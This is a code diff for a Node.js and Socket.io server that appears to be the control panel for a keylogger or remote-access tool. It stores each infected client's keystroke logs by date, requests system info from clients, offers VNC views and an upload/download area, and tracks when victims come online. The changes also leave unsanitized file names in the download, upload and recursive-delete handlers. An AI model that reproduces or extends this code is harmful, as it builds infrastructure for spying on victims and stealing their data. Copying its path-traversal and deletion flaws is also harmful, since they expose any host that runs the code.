@@ -4,7 +4,9 @@ const socketio = require("socket.io");
 const fs = require("fs");
 const app = express();
 const render = require("./js/views.js");
-const sharp = require("sharp");
+const fileUpload = require('express-fileupload');
+
+//const sharp = require("sharp");
 
 const server = app.listen(3000, function () {
   console.log("App listening on port 3000!");
@@ -13,7 +15,7 @@ const io = socketio(server, {
   maxHttpBufferSize: 10e6,
   pingTimeout: 60000,
   cors: {
-    origin: "*",
+    origin: "*", // for browser extension
   },
 });
 let clients = [];
@@ -48,7 +50,7 @@ app.use(
 
 app.use(express.static("views"));
 app.use(express.static("clients"));
-
+app.use(fileUpload());
 app.use(express.static(__dirname + "/public")); //Set public files to use
 
 app.set("view engine", "ejs");
@@ -63,6 +65,7 @@ app.use(
     }, //Remember to set it to true!
   })
 );
+// app.get('*', render.errorHandler);
 
 app.get("/", render.loginPage); //Render main page with login and register etc.
 
@@ -74,39 +77,63 @@ app.post("/", render.login);
 
 app.get("/vnc/:ClientName/:ClientId", render.vncclient);
 
-app.get("/ftp/:Action?/:FileName?", (req, res) => {
+function getFilesizeInBytes(filename) {
+  var stats = fs.statSync(`./ftp/${filename}`);
+  var fileSizeInBytes = stats.size;
+  return fileSizeInBytes;
+}
+
+app.get("/ftp/:FileName?", (req, res) => {
   if (req.params.FileName == null) {
     if (req.session.isLogged) {
+      var files = fs.readdirSync("./ftp");
+      var sizes = [];
+
+      files.forEach(function(file){
+        sizes.push(getFilesizeInBytes(file))
+      })
+      console.log(sizes);
       res.render("ftp", {
         isLogged: req.session.isLogged,
         username: req.session.username,
-        files: fs.readdirSync("./ftp"),
+        files: files,
+        sizes: sizes,
       });
     } else res.render("index");
-  } else if (req.session.Action == "download" && req.params.FileName != null) {
+  } else {
     res.download("ftp/" + req.params.FileName, function (err) {
       if (err) {
         console.log(err);
       }
     });
-  } else if (req.session.Action == "upload") {
-    console.log(req);
-  }
+  } 
 });
-app.post("/ftp/:Action?/:FileName?", (req, res) => {
-  console.log("chuj");
-  console.log(req.body);
+app.post("/ftp", (req, res) => {
   //fs.appendFileSync("./ftp/" + "test", req.)
+
+  console.log(req.files)
+  if (!req.files || Object.keys(req.files).length === 0) {
+    return res.status(400).send('No files were uploaded.');
+  }
+
+  // The name of the input field (i.e. "sampleFile") is used to retrieve the uploaded file
+  let File = req.files.file;
+
+  // Use the mv() method to place the file somewhere on your server
+  File.mv(`./ftp/${File.name}`, function(err) {
+    if (err)
+      return res.status(500).send(err);
+
+    res.send('File uploaded!');
+  });
 });
 
-app.get("/logs/:ClientName/:DirName?/:FileName?", (req, res) => {
+app.get("/logs/:ClientName/:FileName?", (req, res) => {
   const ClientName = req.params.ClientName;
-  const DirName = req.params.DirName;
   const FileName = req.params.FileName;
   var fileContents;
   var ext;
 
-  if (DirName != null && fs.existsSync(`./clients/${ClientName}`)) {
     if (FileName != null) {
       //Pobiera zawartosc pliku
       try {
@@ -116,29 +143,28 @@ app.get("/logs/:ClientName/:DirName?/:FileName?", (req, res) => {
           .join(".");
         if (ext == "txt") {
           fileContents = fs
-            .readFileSync(`./clients/${ClientName}/${DirName}/${FileName}`)
+            .readFileSync(`./clients/${ClientName}/${FileName}`)
             .toString();
         } else {
           fileContents = fs.readFileSync(
-            `./clients/${ClientName}/${DirName}/${FileName}`,
+            `./clients/${ClientName}/${FileName}`,
             "base64"
           );
         }
       } catch (err) {}
     } else {
-      fileContents = fs.readdirSync(`./clients/${ClientName}/${DirName}`);
+      fileContents = fs.readdirSync(`./clients/${ClientName}`);
     }
-  } else {
-    fileContents = fs.readdirSync(`./clients/${ClientName}`);
-  }
+
 
   //Render log
   if (req.session.isLogged) {
     res.render("log", {
       content: fileContents,
       clientname: ClientName,
-      dirname: DirName,
       filename: FileName,
+      isLogged: req.session.isLogged,
+      username: req.session.username,
       type: ext,
     });
   } else res.render("index");
@@ -164,16 +190,15 @@ io.of("/extension").on("connection", (socket) => {
 });
 io.on("connection", (socket) => {
   socket.on("join", (msg) => {
-    let info = msg.split(":");
-    socket.ip = info[0];
-    socket.name = info[1];
-    socket.version = info[2];
+    // let info = msg.split(":");
+    // socket.ip = info[0];
+    // socket.name = info[1];
+    // socket.version = info[2];
     socket.joined = false;
-    // socket.version = msg;  -- for client version 1.1
+    socket.version = msg;  //-- for client version 1.1
 
     console.log("Dolaczono: " + socket.name + " " + socket.ip);
     socket.emit("command", "systeminfo");
-    checkDirectoryExists(socket.name);
   });
 
   socket.on("logs", async (msg) => {
@@ -259,7 +284,11 @@ io.on("connection", (socket) => {
     });
     offlineclients.splice(offlineclients.indexOf(msg.clientname), 1);
   });
-
+  socket.on("delete-ftp", async (msg) => {
+    fs.rmSync(`./ftp/${msg.filename}`, {
+      recursive: true,
+    });
+  });
   socket.on("disconnect", () => {
     if (socket.name != null) {
       //if socket is a keylogger instance
@@ -268,6 +297,8 @@ io.on("connection", (socket) => {
       removeById(clients, socket.id);
       offlineclients.push(socket.name);
       //offlineclients.push(socket.name);
+      io.emit("leave", {name: socket.name})
+
     }
   });
 });
@@ -289,25 +320,30 @@ function parseClientInfo(decodedString, socket) {
     version: socket.version,
     system: osName,
   });
-  let index = offlineclients.indexOf("test");
+  checkDirectoryExists(socket.name);
+
+  let index = offlineclients.indexOf(socket.name);
   if (index > -1) {
     offlineclients.splice(index, 1);
   }
+  io.emit("join", {name: socket.name})
 }
 
 function checkDirectoryExists(clientname) {
   if (!fs.existsSync(`./clients`)) fs.mkdirSync("./clients");
 
-  if (!fs.existsSync(`./clients/${clientname}`)) {
+  if (!fs.existsSync(`./clients/${clientname}`)) 
     fs.mkdirSync(`./clients/${clientname}`);
-    fs.mkdirSync(`./clients/${clientname}/logs`);
-    fs.mkdirSync(`./clients/${clientname}/screenshots`);
-  }
+
 }
 
 function writeToFile(clientname, msg) {
+    var d = new Date(),
+      dformat =
+        [d.getMonth() + 1, d.getDate(), d.getFullYear()].join("_")
+
   msg = msg.replace("\n", "");
-  fs.appendFileSync(`./clients/${clientname}/logs/log.txt`, msg + "\n");
+  fs.appendFileSync(`./clients/${clientname}/${dformat}.txt`, msg + "\n");
 }
 
 const removeById = (arr, id) => {
